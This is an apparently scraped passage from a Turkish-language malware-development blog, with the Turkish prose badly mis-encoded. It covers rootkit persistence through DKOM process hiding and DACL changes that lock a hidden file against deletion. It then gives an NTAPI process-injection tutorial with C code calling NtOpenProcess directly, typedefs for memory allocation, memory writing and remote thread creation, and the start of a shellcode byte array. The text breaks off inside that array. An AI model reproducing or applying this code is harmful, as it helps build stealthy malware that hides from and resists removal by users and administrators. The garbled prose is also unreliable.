22000) { return 0x448; // Windows 10 / 11 tested offset } else if (MajorVersion == 6 \u0026\u0026 MinorVersion == 3) { return 0x2e8; // Windows 8 } else if (MajorVersion == 6 \u0026\u0026 MinorVersion == 1) { return 0x118; // Windows 7 } return 0; } Manipulating the Permissions of the Hidden File Son darbe rootkit tarafÄ±ndan gelmektedir. OluÅŸturulan gizli dosya ve indirilen executable dosyanÄ±n izinleri manipÃ¼le edilir.\nWindowsâ€™ta dosya izinleri, Ä°steÄŸe BaÄŸlÄ± EriÅŸim Kontrol Listeleri (DACLâ€™ler) iÃ§eren GÃ¼venlik TanÄ±mlayÄ±cÄ±larÄ± aracÄ±lÄ±ÄŸÄ±yla yÃ¶netilir. DACLâ€™yi deÄŸiÅŸtirerek ÅŸunlarÄ± yapabilirsiniz:\nStandart kullanÄ±cÄ±larÄ±n okuma, yazma veya silme eriÅŸimini reddedebilirsiniz.\nYalnÄ±zca gÃ¼venilen sistem iÅŸlemlerinin veya yÃ¶neticilerin gizli dosyayla etkileÅŸime girmesine izin verin.\nDosyanÄ±n yanlÄ±ÅŸlÄ±kla veya kÃ¶tÃ¼ niyetle kaldÄ±rÄ±lmasÄ±nÄ± Ã¶nleme.\nRootkit tarafÄ±ndan gizli dosya ve executable dosyasÄ± silinemez ve Ã§alÄ±ÅŸtÄ±rÄ±lamaz hale getirelecektir. Bu izin deÄŸiÅŸikliÄŸi hem admin hem de normal kullanÄ±cÄ±larÄ±nÄ± etkileyecek ÅŸekilde hareket eder.\nSonuÃ§ Bu dÃ¶kÃ¼manda, sonlandÄ±rÄ±ldÄ±ÄŸÄ±nda kendini otomatik olarak yeniden baÅŸlatarak malwareâ€™inn devam etmesini saÄŸlayan bir tekniÄŸe deÄŸindik. DKOM aracÄ±lÄ±ÄŸÄ±yla process gizleme ve gizli dosyalarÄ±n gÃ¼venliÄŸini saÄŸlama dahil olmak Ã¼zere usermode ve kernelmode rootkit yÃ¶ntemlerini birleÅŸtiren bir proje Ã¼zerinde Ã§alÄ±ÅŸtÄ±k."},"title":"Malware Resurrection"},"/tr/docs/malware-dev/ntapi-injection/":{"data":{"":"","ntapi-ile-shellcode-Ã§alÄ±ÅŸtÄ±rma#NTAPI ile Shellcode Ã‡alÄ±ÅŸtÄ±rma":"","ntapi-injection-nedir#\u003cstrong\u003eNTAPI Injection Nedir?\u003c/strong\u003e":"","ntapi-nedir#\u003cstrong\u003eNTAPI Nedir?\u003c/strong\u003e":"","sonuÃ§#SonuÃ§":"Merhabalar. Bu blogta NTAPI Injection konusunu Ã¶ÄŸreneceÄŸiz.\nUser mode ve Kernel Mode TekniÄŸe geÃ§meden Ã¶nce bazÄ± temel ÅŸeyleri anlamamÄ±z gerekiyor ve User-Mode ve Kernel-Mode nedir bunlara bir gÃ¶z atalÄ±m.\nWindows iÅŸletim sistemi, temel olarak iki farklÄ± Ã§alÄ±ÅŸma alanÄ± sunar: user mode (kullanÄ±cÄ± modu) ve kernel mode (Ã§ekirdek modu). Bu ayrÄ±m, iÅŸletim sisteminin gÃ¼venliÄŸini, iÅŸleyiÅŸinin dÃ¼zenlenmesi ve kaynaklarÄ±n verimli bir ÅŸekilde kullanÄ±lmasÄ± Ã¼zerine kuruludur. Her iki alan da farklÄ± roller Ã¼stlenir ve birbirini tamamlar.\nUser mode (Ring 3), iÅŸletim sisteminde Ã§alÄ±ÅŸan uygulamalar ve processâ€™ler iÃ§in ayrÄ±lmÄ±ÅŸ bir alandÄ±r. Bu modda Ã§alÄ±ÅŸan processâ€™ler, sistem kaynaklarÄ±na ve donanÄ±ma doÄŸrudan eriÅŸemez. Bunun yerine, iÅŸletim sisteminin kernel modunda Ã§alÄ±ÅŸan Ã§ekirdek bileÅŸenlerine Ã§aÄŸrÄ±lar yapar. Bu Ã§aÄŸrÄ±lar, genellikle WinAPI ve asÄ±l konumuz olan ve daha alt seviyede NTAPI Ã¼zerinden gerÃ§ekleÅŸtirilir. User mode alanÄ±n diÄŸer Ã¶zellikleri:\nKullanÄ±cÄ± uygulamalarÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± gÃ¼venli bir alan saÄŸlar. Ã‡Ã¶kme durumunda yalnÄ±zca ilgili uygulamayÄ± etkiler, sistemin tamamÄ±nÄ± etkilemez. DonanÄ±m eriÅŸimi iÃ§in kernel modeâ€™a geÃ§iÅŸ yapmasÄ± gerekir. Kernel mode (Ring 0) ise iÅŸletim sisteminin Ã§ekirdeÄŸi ve donanÄ±mla doÄŸrudan iletiÅŸimde olan bileÅŸenlerin Ã§alÄ±ÅŸtÄ±ÄŸÄ± alandÄ±r. Bu modda Ã§alÄ±ÅŸan driverâ€™lar, sistem Ã¼zerinde tam kontrole sahiptir yani user-mode alanÄ±na kÄ±yasla daha fazla ayrÄ±calÄ±ÄŸa ve gÃ¼ce sahiptir. Ancak bu gÃ¼Ã§, beraberinde bÃ¼yÃ¼k bir sorumluluk getirir: Kernel modunda oluÅŸan hatalar tÃ¼m sistemi etkileyebilir ve Ã§Ã¶kmesine neden olabilir. Kernel mode alanÄ±n diÄŸer Ã¶zellikleri:\nDonanÄ±ma ve sistem kaynaklarÄ±na doÄŸrudan eriÅŸim saÄŸlar. GÃ¼venlik Ã¶nlemleri ve hata toleransÄ± aÃ§Ä±sÄ±ndan daha az izole bir ortamdÄ±r. NTAPI Ã§aÄŸrÄ±larÄ±nÄ±n iÅŸlenip yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼ seviyedir. NTAPI Nedir? EÄŸer Ã¶nceki DLL Injection ve Shellcode Execution blog yazÄ±larÄ±mÄ± takip ettiyseniz, bu tekniklerde kodlarÄ±mÄ±zÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in genellikle WinAPI iÅŸlevlerini kullandÄ±ÄŸÄ±mÄ±zÄ± hatÄ±rlarsÄ±nÄ±z. Ancak WinAPI, Windows iÅŸletim sisteminin daha kullanÄ±cÄ± dostu bir katmanÄ±nÄ± temsil eder ve temelinde NTAPI (Native API) yer alÄ±r.\nNTAPI, Windowsâ€™un hem kernel mode (Ã§ekirdek modu) hem de user mode (kullanÄ±cÄ± modu) uygulamalarÄ± tarafÄ±ndan kullanÄ±lan hafif ve dÃ¼ÅŸÃ¼k seviyeli bir programlama arayÃ¼zÃ¼dÃ¼r. WinAPIâ€™nin arka plandaki iÅŸleyiÅŸi bÃ¼yÃ¼k Ã¶lÃ§Ã¼de NTAPIâ€™ye dayanÄ±r. Ã–rneÄŸin, WinAPI iÅŸlevlerini gerÃ§ekleÅŸtiren birÃ§ok alt program, kernel32.dll gibi kÃ¼tÃ¼phaneler aracÄ±lÄ±ÄŸÄ±yla NTAPI Ã§aÄŸrÄ±larÄ±nÄ± kullanÄ±r.\nKafanÄ±za daha iyi oturmak iÃ§in bir senaryo oluÅŸturalÄ±m. Diyelim ki user mode programÄ±ndan OpenProcessâ€™i Ã§aÄŸÄ±rdÄ±ÄŸÄ±mÄ±zÄ± varsayalÄ±m. AÅŸaÄŸÄ±daki diyagramda gÃ¶sterilen iÅŸlemler gerÃ§ekleÅŸecektir:\nDiyagramÄ±mÄ±za gÃ¶z attÄ±ÄŸÄ±mÄ±zda User mode programÄ±n Ã§aÄŸÄ±rdÄ±ÄŸÄ± OpenProcess APIâ€™si ilk olarak kernel32.dllâ€˜de kÃ¼tÃ¼phanesine yÃ¶nleniyor ve artÄ±k bu modun son duraÄŸÄ± olan ntdll.dll kÃ¼tÃ¼phanesine yÃ¶neldiÄŸinde NtOpenProcessâ€™e dÃ¶nÃ¼ÅŸtÃ¼ÄŸÃ¼nÃ¼ gÃ¶rÃ¼yoruz. ntdll.dll kÃ¼tÃ¼phanesi user-mode alanÄ± iÃ§in son duraktÄ±r ve artÄ±k bundan sonraki akÄ±ÅŸ kernel alanÄ±nda devam edecek.\nKernel alanÄ±nda ise ilk olarak SSDT dediÄŸimiz tabloya yÃ¶nlendiriliyor Burada SSDT anlatarak kafanÄ±zÄ± Ã§ok bulandÄ±rmak istemiyorum zira biraz ileri seviye ve kafa karÄ±ÅŸtÄ±rÄ±cÄ± bir konu. Ancak kafanÄ±zda kalmasÄ± iÃ§in ÅŸu ÅŸekilde dÃ¼ÅŸÃ¼nebilirsiniz: SSDT (System Service Descriptor Table), user modeâ€™dan yapÄ±lan sistem Ã§aÄŸrÄ±larÄ±nÄ±n kernel modeâ€™daki doÄŸru APIâ€™lara yÃ¶nlendirilmesini saÄŸlayan bir kÃ¶prÃ¼ gÃ¶revi gÃ¶rÃ¼r. Bu tablo, Ã§aÄŸrÄ±lan Native APIâ€™larÄ± alÄ±r ve kernel modeâ€™da, ntoskrnl.exe iÃ§indeki ilgili adreslere yÃ¶nlendirir. EÄŸer SSDT yakÄ±ndan tanÄ±mak isterseniz SSDT ile ilgili bloguma gÃ¶z atabilirsiniz.\nSSDT tablosundan sonra ise ntoskrnl.exe iÃ§erisinden NtOpenProcessâ€™in adresine yÃ¶nlendirilerek iÅŸlemlerin tamamlandÄ±ÄŸÄ±nÄ± gÃ¶rebiliriz.\nBunu canlÄ± bir ÅŸekilde gÃ¶rmemiz de mÃ¼mkÃ¼n. Visual Studioâ€™da sadece OpenProcessâ€™i Ã§aÄŸÄ±rdÄ±ÄŸÄ±mÄ±z proje oluÅŸturalÄ±m ve ardÄ±ndan Windbgâ€™da analiz ederek nelere dÃ¶nÃ¼ÅŸtÃ¼ÄŸÃ¼ne gÃ¶z atalÄ±m:\nUser-mode alanÄ±nda son durak olan ntdll.dllâ€™e bir breakpoint koyup programÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra Call Stackâ€™e gÃ¶z attÄ±ÄŸÄ±mÄ±zda ilk baÅŸta KERNELBASE!OpenProcessâ€˜in Ã§aÄŸÄ±rÄ±ldÄ±ÄŸÄ±nÄ± ve sonra ntdll!NtOpenProcess Ã§aÄŸÄ±rÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rebiliriz. ntdll.dllâ€™den sonra akÄ±ÅŸ kernel alanÄ±nda devam edecek.\nNTAPI Injection Nedir? ArtÄ±k temel bilgilerden sonra asÄ±l konumuza gelebiliriz.\nNTAPI Injection tekniÄŸi, ntdll.dll tarafÄ±ndan saÄŸlanan Windows Native API ile doÄŸrudan etkileÅŸim kurmayÄ± iÃ§erir. Yani bu teknikten yararlanan bir malware, daha yÃ¼ksek seviyeli Windows APIâ€™lar kullanmak yerine ntdll.dllâ€™den daha dÃ¼ÅŸÃ¼k seviyeleri kullanÄ±r. Ã–rneÄŸin malwareâ€™da OpenProcess Ã§aÄŸÄ±rÄ±lmaz ve direkt olarak alt seviyesi olan NtOpenProcess Ã§aÄŸÄ±rÄ±lÄ±r.\nTekniÄŸi daha yakÄ±ndan anlamak iÃ§in basit bir kodlama yapalÄ±m. Bunun iÃ§in user-mode alanÄ±ndan direkt olarak ntdll.dllâ€™den bir NTAPI nasÄ±l Ã§aÄŸÄ±rÄ±lÄ±r buna bakalÄ±m. Ã–rneÄŸimiz NtOpenProcess olacak.\nÃ–ncelikle kodlamaya geÃ§meden hazÄ±rlÄ±k yapmamÄ±z gerekiyor. Direkt olarak daha dÃ¼ÅŸÃ¼k seviyeli APIâ€™lar Ã§aÄŸÄ±racaÄŸÄ±mÄ±zdan ve bunlar user-mode alanlarÄ± iÃ§in tanÄ±mlanmadÄ±ÄŸÄ±ndan kendimiz tanÄ±mlayÄ±p ardÄ±ndan adresini alarak Ã§aÄŸÄ±rmamÄ±z gerekecek.\nÄ°lgili NTAPI oluÅŸturmak iÃ§in benim de sÄ±klÄ±kla yararlandÄ±ÄŸÄ±m NtDoc gibi sitelerden yararlanabiliriz:\nProjenizde kullanmak istediÄŸiniz NTAPI aratarak yapÄ±ya ulaÅŸabiliriz. Bizim amacÄ±mÄ±z projede NtOpenProcess Ã§aÄŸÄ±rmak olduÄŸu iÃ§in bunu aratalÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi NtOpenProcess APIâ€™i dÃ¶rt parametre aldÄ±ÄŸÄ±nÄ± gÃ¶rebiliriz:\nNTSYSCALLAPI NTSTATUS NTAPI NtOpenProcess( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ PCOBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId ); HatÄ±rlarsanÄ±z OpenProcess fonksiyonu Ã¼Ã§ parametre alÄ±rken alt seviyesi olan NtOpenProcess dÃ¶rt parametre almakta. AyrÄ±ca OpenProcessâ€™e kÄ±yasla iki parametre farklÄ±.\nÅimdi bu aldÄ±ÄŸÄ±mÄ±z yapÄ±yÄ± projemize ekleyelim:\nYapÄ±yÄ± projemize eklediÄŸimizde son iki yapÄ±lar iÃ§in hata verdiÄŸini gÃ¶receksiniz. Bunlar da usermode alanÄ± iÃ§in tanÄ±mlÄ± olmadÄ±ÄŸÄ±ndan ntdoc gibi sitelerden bu yapÄ±larÄ± tanÄ±mlamamÄ±z gerekecek. Sitede CLIENT_ID ve OBJECT_ATTRIBUTES diye aratarak yapÄ±larÄ± ekleyebiliriz:\nBu iki yapÄ±dan sonra hata aldÄ±ÄŸÄ±nÄ±z diÄŸer yapÄ±larÄ± da siteden aratarak tanÄ±mlayÄ±n. BÃ¶ylece alÄ±ÅŸmÄ±ÅŸ olursunuz.\nKodlamaya geÃ§meden Ã¶nce son olarak NTSTATUSâ€™u da tanÄ±mlamamÄ±z gerekecek. NTAPIâ€™larÄ±n dÃ¶nÃ¼ÅŸ adresi NTSTATUS dediÄŸimiz tipte olduÄŸu iÃ§in bunu da tanÄ±mlayÄ±p NTSTATUS deÄŸerlerine gÃ¶re baÅŸarÄ±lÄ± olup olmadÄ±ÄŸÄ±nÄ± gÃ¶receÄŸiz:\ntypedef _Return_type_success_(return \u003e= 0) long NTSTATUS; Bunu da projemize ekleyelim. ArtÄ±k kodlamaya geÃ§ebiliriz:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef const UNICODE_STRING* PCUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PCUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR; PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* NtOpenProcess)( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Kullanim: program.exe \u003cPID\u003e\\n\"); return -1; } DWORD PID = atoi(argv[1]); HMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); NtOpenProcess NtOpenProcessAddress = (NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); HANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); return 0; } Kod parÃ§amÄ±z bu ÅŸekilde. DetaylÄ±ca gÃ¶z atalÄ±m:\nHMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); main iÃ§erisinde ilk olarak ntdll.dllâ€™in adresini alarak baÅŸlÄ±yoruz. ntdllâ€™in adresini aldÄ±ktan sonra bu kÃ¼tÃ¼phane iÃ§erisinden NtOpenProcessâ€™in adresine ulaÅŸacaÄŸÄ±z.\nNtOpenProcess NtOpenProcessAddress = (NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); ntdllâ€™in adresini aldÄ±ktan sonra GetProcAddress ile ntdll iÃ§erisinden NtOpenProcessâ€™in adresini alÄ±yoruz ve projede oluÅŸturduÄŸumuz NtOpenProcess yapÄ±sÄ±na bu adresi veriyoruz.\nHANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); Son olarak ise NtOpenProcessâ€™i Ã§aÄŸÄ±rÄ±yoruz. Ancak ondan Ã¶nce OBJECT_ATTRIBUTES ve CLIENT_ID yapÄ±larÄ±nÄ± tanÄ±mlÄ±yoruz.\nÅu kÄ±sma da dikkat edin, OpenProcessâ€™te PID deÄŸeri direkt olarak DWORD ile verilirken NtOpenProcess direkt olarak PID deÄŸerini almÄ±yor ve CLIENT_IDâ€™in birinci elemanÄ± ve HANDLE tipinde olan UniqueProcessâ€™e veriliyor.\nGÃ¶zÃ¼mÃ¼z bu kÄ±sÄ±mdaki if koÅŸuluna kaysÄ±n. User mode WinAPIâ€™larÄ±na kÄ±yasla NTSTATUS tipinde sonuÃ§ dÃ¶ndÃ¼ren NTAPIâ€™larda eÄŸer 0 sonucunu dÃ¶ndÃ¼rÃ¼rse baÅŸarÄ±lÄ± olduÄŸunu gÃ¶sterir. Bu yÃ¼zden koÅŸulda eÄŸer sonuÃ§ olarak 0â€™dan farklÄ± bir deÄŸer dÃ¶ndÃ¼rÃ¼yorsa hata durumunu ekrana bastÄ±rÄ±yoruz.\nProgramÄ± direkt olarak Ã§alÄ±ÅŸtÄ±rÄ±p sonucu gÃ¶rmek yerine daha detaylÄ± analiz ederek arka planda neler olduÄŸuna bir tekrar bakalÄ±m. Windbgâ€™a kodladÄ±ÄŸÄ±mÄ±z .exe dosyasÄ±nÄ± verelim:\nDebug buttonâ€™a basdÄ±ktan sonra main fonksiyona bir bp koyup Ã§alÄ±ÅŸtÄ±ralÄ±m:\nWindbgâ€™Ä±n Ã¼st kÄ±smÄ±ndan View \u003e Dissassembly seÃ§eceÄŸini aktifleÅŸtirelim ve gelen ekrandan main fonksiyonun disassembly haline gÃ¶z atalÄ±m:\nmain fonksiyona gÃ¶z atarken ilk olarak GetModuleHandeW ile aldÄ±ÄŸÄ±mÄ±z ntdllâ€™in adresine gÃ¶z atarak baÅŸlayabiliriz. GetModuleHandleW Ã§alÄ±ÅŸtÄ±ktan sonraki kÄ±sma bir bp koyup raxâ€™Ä±n ne deÄŸer aldÄ±ÄŸÄ±na bir bakalÄ±m:\nGetModuleHandleW Ã§alÄ±ÅŸtÄ±ktan sonra raxâ€™Ä±n aldÄ±ÄŸÄ± deÄŸere gÃ¶z attÄ±ÄŸÄ±mÄ±zda ntdll.dllâ€™in baÅŸlangÄ±Ã§ adresine iÅŸaret ettiÄŸini doÄŸrulayabiliriz.\nSonraki duraÄŸÄ±mÄ±z GetProcAddress ile NtOpenProcessâ€™in adresi alÄ±ndÄ±ÄŸÄ± kÄ±sÄ±m olacak:\nAynÄ± ÅŸekilde GetProcAddress Ã§alÄ±ÅŸtÄ±ktan sonraki kÄ±sma bir bp koyalÄ±m ve raxâ€™Ä±n aldÄ±ÄŸÄ± deÄŸere gÃ¶z atalÄ±m:\nGÃ¶rÃ¼ldÃ¼ÄŸÃ¼ Ã¼zere GetProcAddressâ€™in Ã§alÄ±ÅŸmasÄ±yla 00007ffc`7c6dfbd0 adresi elde ediliyor ve adresi kontrol ettiÄŸimizde ntdll iÃ§erisinden NtOpenProcess olduÄŸunu gÃ¶rebiliyoruz.\nÅimdi ise son olarak odaÄŸÄ±mÄ±zÄ± NtOpenProcessâ€™i Ã§aÄŸÄ±rdÄ±ÄŸÄ±mÄ±z noktaya Ã§evirelim:\nBu kÄ±sÄ±mda NtOpenProcess iÃ§in parametrelerin hazÄ±rlandÄ±ÄŸÄ±nÄ± ve daha sonradan NtOpenProcessâ€™i Ã§aÄŸÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶rebiliriz. Ancak bir ÅŸeyin dikkatinizi Ã§ekmesini istiyorum: parametreler ters olarak hazÄ±rlanmÄ±ÅŸ. Sembol isimlerine bakarsanÄ±z ilk olarak CID yapÄ±sÄ±nÄ±n hazÄ±rlandÄ±ÄŸÄ±nÄ± ve r9 registerâ€™a verildiÄŸini ve en son olarak rcx registerâ€™a HandleProcessâ€™in adresini verildiÄŸini gÃ¶receksiniz.\nOpenProcess gibi WIN32 API'lar stdcall Ã§aÄŸÄ±rma kurallarÄ±nÄ± kullanÄ±r. Daha iyi anlamak iÃ§in Microsoft Learn dÃ¶kÃ¼manÄ±ndan yararlanabiliriz:\nâ€œWin32 API iÅŸlevlerini Ã§aÄŸÄ±rmak iÃ§in __stdcall Ã§aÄŸrÄ± kuralÄ± kullanÄ±lÄ±r. Ã‡aÄŸÄ±ran kiÅŸi yÄ±ÄŸÄ±nÄ± temizler, bu nedenle derleyici vararg iÅŸlevlerini __cdecl yapar. Bu Ã§aÄŸÄ±rma kuralÄ±nÄ± kullanan fonksiyonlar bir fonksiyon prototipi gerektirir. stdcall deÄŸiÅŸtiricisi Microsoftâ€™a Ã¶zgÃ¼dÃ¼r.â€\nWIN32 APIâ€™lar stdcall Ã§aÄŸrÄ± kuralÄ±nÄ± kullandÄ±ÄŸÄ± iÃ§in parametreler saÄŸdan sola doÄŸru hazÄ±rlanÄ±r:\nDaha iyi anlamak iÃ§in C kodumuza tekrar dÃ¶nelim:\nNTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); Her ne kadar projede NtOpenProcessâ€™in parametrelerini bÃ¶yle hazÄ±rlasak da, OpenProcess stdcall kuralÄ±na dahil olduÄŸu iÃ§in arka planda bu parametreler saÄŸdan sola hazÄ±rlanacaktÄ±r. Yani ÅŸu ÅŸekilde:\nNTSTATUS Status = NtOpenProcessAddress(\u0026CID, \u0026ObjAttr, PROCESS_ALL_ACCESS, \u0026HandleProcess); Yine parametrelere hazÄ±rlanÄ±rken r9 gibi registerâ€™lara hazÄ±rlandÄ±ÄŸÄ±nÄ± gÃ¶receksiniz. Bu registerâ€™lar rastgele kullanÄ±lmÄ±yor yine Windowsâ€™un x64 Calling Convention ile ilgili:\nâ€œÄ°lk dÃ¶rt sÄ±radaki tam sayÄ± (integer) tÃ¼rÃ¼ndeki argÃ¼manlar sÄ±rasÄ±yla RCX, RDX, R8 ve R9 kayÄ±tlarÄ±na atanÄ±r. BeÅŸinci ve daha sonraki argÃ¼manlar, yukarÄ±da belirtildiÄŸi ÅŸekilde yÄ±ÄŸÄ±ta aktarÄ±lÄ±r.â€\nFonksiyonun ilk dÃ¶rt parametresi rcx, rdx, r8 ve r9 registerâ€™lara aktarÄ±lÄ±r. EÄŸer dÃ¶rtten fazla parametre barÄ±ndÄ±rÄ±yorsa diÄŸerleri stackâ€™e aktarÄ±lÄ±yor. Daha iyi anlamak iÃ§in NtOpenProcessâ€™e yÃ¶nelirsek, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi hazÄ±rlanacaktÄ±r:\nNTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); // r9 = \u0026CID, r8 = \u0026ObjAttr, rdx = PROCESS_ALL_ACCESS (1FFFFFh), rcx = \u0026HandleProcess AyrÄ±ca Disassembly ekranÄ±na tekrar bakarsak bunu doÄŸrulayabiliriz:\nArtÄ±k main iÃ§erisinde NtOpenProcessâ€™i Ã§aÄŸÄ±rdÄ±ÄŸÄ±mÄ±z kÄ±sma bir bp koyalÄ±m ve programÄ± p ile devam ettirerek NtOpenProcessâ€™in dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ deÄŸere bakalÄ±m:\nNtOpenProcess Ã§alÄ±ÅŸtÄ±ktan sonra 0 deÄŸeri dÃ¶ndÃ¼rdÃ¼. Ne demiÅŸtim hatÄ±rlayalÄ±m: NTSTATUS tipinde dÃ¶nÃ¼ÅŸ yapan Native APIâ€™lar, eÄŸer 0 dÃ¶ndÃ¼rÃ¼rse baÅŸarÄ±lÄ± olduÄŸunu gÃ¶sterir.\nProjede yaptÄ±ÄŸÄ±mÄ±z iÅŸlemlerin diyagramÄ±nÄ± hazÄ±rlayalÄ±m:\nÄ°lk diyagramdan hatÄ±rlarsanÄ±z ilk duraÄŸÄ±mÄ±z kernel32.dllâ€™di ancak projemizde bu kÄ±smÄ± atlayarak programda ntdll.dllâ€™den NtOpenProcessâ€™e ulaÅŸÄ±yoruz.\nNTAPI ile Shellcode Ã‡alÄ±ÅŸtÄ±rma ArtÄ±k NTAPI Injection tekniÄŸinde neler yaptÄ±ÄŸÄ±mÄ±zÄ± biliyoruz. Shellcode Execution projemizde yaptÄ±ÄŸÄ±mÄ±z adÄ±mlarÄ± yapacaÄŸÄ±z ancak farklÄ± olarak NTAPI kullanacaÄŸÄ±z.\nÃ–ncelikle projede utils.h header oluÅŸturalÄ±m ve aÅŸaÄŸÄ±daki kodlarÄ± yapÄ±ÅŸtÄ±ralÄ±m:\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e #pragma once #define STATUS_SUCCESS (NTSTATUS)0x00000000L #pragma region STRUCTURES typedef struct _OBJECT_ATTRIBUTES { ULONG Length; VOID* RootDirectory; struct _UNICODE_STRING* ObjectName; ULONG Attributes; VOID* SecurityDescriptor; VOID* SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _PS_ATTRIBUTE { ULONGLONG Attribute; SIZE_T Size; union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* fn_NtOpenProcess) ( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory) ( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory) ( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx) ( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtWaitForSingleObject) ( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); typedef NTSTATUS(NTAPI* fn_NtClose) ( IN HANDLE Handle ); #pragma endregion ArdÄ±ndan main.c projemizi kodlayalÄ±m:\n#include \"utils.h\" /* cmd.exe /K \"echo NTAPI Injection with bekoo\" */ char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" 